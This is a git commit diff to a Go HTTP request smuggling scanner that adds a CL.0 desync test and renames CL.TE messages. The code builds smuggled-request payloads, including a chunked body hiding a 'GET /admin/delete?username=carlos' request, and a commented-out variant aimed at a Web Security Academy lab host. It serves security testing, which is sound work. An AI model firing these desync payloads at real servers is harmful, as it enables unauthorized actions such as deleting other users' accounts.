9a3794269cd0c6792f9864bffbd6611d3a2893b1
AkewakBiru <akawaq1234@gmail.com>
2025-04-09 20:22:42 +0400

    add CL.0 test

--- smuggler/cl.go
+++ smuggler/cl.go
@@ -21,18 +21,45 @@ func (cl *CL) Run() bool {
 	if !cl.H1Supported {
 		return false
 	}
-	return cl.runCLTE() // for now
+
+	if config.Glob.ExitEarly {
+		return cl.runCL0() || cl.runCLTE() // for now
+	} else {
+		cl.runCL0()
+		cl.runCLTE()
+	}
+	return true
+}
+
+func (cl *CL) runCL0() bool {
+	ret, _ := cl.H1Test(cl.NewPl("Content-Length: 40"))
+	log.Info().Str("endpoint", cl.URL.String()).Msg("Running CL.0 desync tests...")
+
+	if ret == 1 {
+		log.Info().
+			Str("endpoint", cl.URL.String()).
+			Str("status", "undetermined").
+			Msg("Server might be vulnerable to CL.) desync attack. Further investigate manually")
+		// in this case, make another request and read response (make multiple requests and read multiple responses)
+		// body := "\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: 0a40000c03e54dcc82810b30007e000e.web-security-academy.net\r\n\r\n"
+		// pl := cl.NewPl(fmt.Sprintf("Content-Length: %d", len(body)))
+		// pl.Body = body
+		// cl.H1Test(pl)
+		return true
+	}
+	log.Debug().Msg("Nothing found")
+	return true
 }
 
 func (cl *CL) runCLTE() bool {
-	log.Info().Str("endpoint", cl.URL.String()).Msg("Running CLTE desync tests...")
+	log.Info().Str("endpoint", cl.URL.String()).Msg("Running CL.TE desync tests...")
 	generator := tests.Generator{}
 	payload := generator.Generate(tests.TE, config.Glob.Test)
 
 	ctr := 0
 	for k, vv := range payload {
 		for _, v := range vv {
-			payload := cl.NewPl(fmt.Sprintf("%s:%s", k, v))
+			payload := cl.NewPl(fmt.Sprintf("%s:%s", k, v)) // header key-value pair to be directly added in request hdr
 			if cl.clte(payload) {
 				ctr++
 				if config.Glob.ExitEarly {
@@ -59,12 +86,12 @@ func (cl *CL) runCLTE() bool {
 		log.Info().
 			Str("endpoint", cl.URL.String()).
 			Str("status", "success").
-			Msgf("finished CLTE desync tests: PoC payload stored in /result/%s directory", cl.URL.Hostname())
+			Msgf("finished CL.TE desync tests: PoC payload stored in /result/%s directory", cl.URL.Hostname())
 	} else {
 		log.Info().
 			Str("endpoint", cl.URL.String()).
 			Str("status", "failure").
-			Msg("finished CLTE desync tests: no issues found")
+			Msg("finished CL.TE desync tests: no issues found")
 	}
 	return false
 }
@@ -87,7 +114,7 @@ func (d *CL) clte(p *h1.Payload) bool {
 					Str("endpoint", d.URL.String()).
 					Msg("disconnected before timeout")
 			}
-			return false
+			return false // normal response (no desync)
 		}
 		p.Cl = 11
 		ret2, err := d.H1Test(p)
@@ -104,14 +131,14 @@ func (d *CL) clte(p *h1.Payload) bool {
 			}
 			log.Info().
 				Str("endpoint", d.URL.String()).
-				Msgf("Potential CLTE issue found - %s@%s://%s%s", d.Method,
+				Msgf("Potential CL.TE issue found - %s@%s://%s%s", d.Method,
 					d.URL.Scheme, d.URL.Host, d.URL.Path)
 			inner := "GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 50\r\n\r\n"
 			tmp := fmt.Sprintf("1\r\nA\r\n0\r\n\r\n%s", inner) // host would be taken from a url given by the user
 			p.Body = tmp
 			p.Cl = len(p.Body)
-			d.H1Test(p) //
-			d.H1Test(p) // to make sure the queued req proceeds
+			// d.H1Test(p) //
+			// d.H1Test(p) // to make sure the queued req proceeds
 			d.GenReport(p)
 			return true
 		}
